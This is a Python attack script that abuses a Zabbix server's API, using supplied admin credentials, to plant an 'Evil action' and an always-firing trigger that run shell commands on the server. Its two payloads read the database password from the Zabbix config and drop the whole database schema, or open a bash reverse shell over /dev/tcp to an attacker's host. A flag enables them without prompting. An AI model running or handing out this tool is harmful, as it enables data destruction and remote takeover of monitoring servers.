#!/usr/bin/python3
import argparse
import sys
import time
import urllib.parse

import pyzabbix

COMMANDS = {
    "destroy-database": '''\
ZABBIX_DBPASSWORD=$(cat /etc/zabbix/zabbix_server.conf | sed -n "s/^DBPassword=//gp")
ZABBIX_DBNAME=$(cat /etc/zabbix/zabbix_server.conf | sed -n "s/^DBName=//gp")
ZABBIX_DBUSER=$(cat /etc/zabbix/zabbix_server.conf | sed -n "s/^DBUser=//gp")
echo "DROP SCHEMA public CASCADE;" | PGPASSWORD=$ZABBIX_DBPASSWORD psql $ZABBIX_DBNAME $ZABBIX_DBUSER -h 127.0.0.1
exit 1
''',
    "remote-shell": '''\
bash -c 'bash -i >&/dev/tcp/{remote_host}/{remote_port} 0>&1 &'
exit 1
'''
}

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("url")
    parser.add_argument("username")
    parser.add_argument("password")
    parser.add_argument("--activate", action="store_true", help="Don't prompt. Just activate the action/trigger right away.")

    subparsers = parser.add_subparsers(dest="command")
    subparsers.required = True

    subparser = subparsers.add_parser("destroy-database")

    subparser = subparsers.add_parser("remote-shell")
    subparser.add_argument("remote_host")
    subparser.add_argument("remote_port")

    args = parser.parse_args()

    if args.command == "remote-shell":
        evil_command = COMMANDS["remote-shell"].format(**vars(args))
    else:
        evil_command = COMMANDS[args.command]

    zapi = pyzabbix.ZabbixAPI(args.url)
    zapi.login(args.username, args.password)

    print("Connected to Zabbix API Version {}".format(zapi.api_version()))

    try:
        zapi.item.create(name="Example item", key_="icmpping[]", hostid=1, type=3, interfaceid=1, value_type=0, delay="30s")

        action = zapi.action.create(name="Evil action", status=1, eventsource=0, esc_period="1h", operations=[{"operationtype": 1, "opcommand": {"type": 0, "execute_on": 1, "command": evil_command}, "opcommand_hst": [{"hostid": "0"}]}])
        action_id = int(action["actionids"][0])
        action_url = urllib.parse.urljoin(args.url, f"actionconf.php?form=update&actionid={action_id}")

        trigger = zapi.trigger.create(description="Example trigger", status=1, expression="{Host:icmpping[].last()}={Host:icmpping[].last()}")
        trigger_id = int(trigger["triggerids"][0])
        trigger_url = urllib.parse.urljoin(args.url, f"triggers.php?form=update&triggerid={action_id}")
    except pyzabbix.ZabbixAPIException as e:
        print(e)
        sys.exit(1)

    print(f"1. Action needs to be enabled: {action_url}")
    print(f"2. Trigger needs to be enabled: {trigger_url}")
    if args.activate:
        _input = "yes"
    else:
        _input = input("Type 'yes' to automatically enable (This will drop the database schema!): ")

    if _input == "yes":
        print("Enabling action and trigger...")
        zapi.action.update(actionid=action_id, status=0)
        zapi.trigger.update(triggerid=trigger_id, status=0)
    else:
        print("Ok. Will not enable...")
